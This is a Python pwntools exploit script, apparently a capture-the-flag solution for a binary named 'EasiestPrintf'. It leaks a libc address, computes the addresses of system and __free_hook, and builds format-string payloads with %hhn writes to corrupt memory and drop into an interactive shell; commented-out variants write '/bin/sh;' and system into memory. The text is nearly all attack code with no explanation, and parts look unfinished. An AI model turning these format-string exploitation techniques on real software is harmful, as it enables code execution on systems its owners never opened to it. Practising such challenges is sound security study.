from pwn import *

target = "./EasiestPrintf"
got_libc_main = 0x08049fec

e = ELF("./ep_libc.so.6")
env = {"LD_PRELOAD": e.path}

'''
def exec_fmt(payload):
	pp = process(target)
	print pp.recv()
	pp.sendline(str(got_libc_main))
	print pp.recvuntil("Good Bye\n")
	pp.sendline(payload)
	recv = pp.recv()
	pp.close()
	return recv

fmt = FmtStr(exec_fmt)
print "libc offset : {}".format(fmt.offset)
'''

# offset : 7

p = process(target, env=env)

print p.recv()
p.sendline(str(got_libc_main))

recv = p.recv().split("\x0a")[0][2:]

addr_bss = 0x08049ecc
got_libc_main = int(recv, 16)
#libc_base = got_libc_main - 0x18540
#got_system = libc_base + 0x3ada0
#addr_free_hook = libc_base - 0x1b38b0
libc_base = got_libc_main - 0x19970
got_system = got_libc_main + e.symbols["system"]
addr_free_hook = got_libc_main + e.symbols["__free_hook"]

print "libc base : {}".format(hex(libc_base))
print "system    : {}".format(hex(got_system))
print "free_hook : {}".format(hex(addr_free_hook))

# write .bss to "sh\x00"
# write __free_hook to system

'''
payload = ""
payload += p32(addr_free_hook)
payload += p32(addr_free_hook+1)
payload += p32(addr_free_hook+2)
payload += p32(addr_free_hook+3)
payload += "%{}c%7$hhn".format( (got_system & 0xff) )
payload += "%{}c%8$hhn".format( (got_system >> 8) & 0xff )
payload += "%{}c%9$hhn".format( (got_system >> 16) & 0xff )
payload += "%{}c%10$hhn".format( (got_system >> 24) & 0xff )
'''

payload = ""
payload += p32(addr_bss)
payload += "%65c%7$hhn"
payload += "A" * (len(payload) % 4)
#payload = fmtstr_payload(fmt.offset, { addr_free_hook: got_system  }) + '%100000c'

print len(payload)
print payload
print repr(payload)

'''
write = {d + 148: 0x0804A570 - 0x1c, 0x0804A570: system + 1}
p = '/bin/sh;'
p += fmtstr_payload(9, write, len(p), 'byte')
'''

p.sendline(payload)
print hexdump(p.leak(addr_bss, 0x30))

raw_input('')
p.sendline(payload)
p.interactive()


''' local offset
system            = libc_base + 0x3ada0
__libc_start_main = libc_base + 0x18540
__free_hook       = libc_base + 0x1b38b0
__malloc_hook     = libc_base + 1b2768
'''




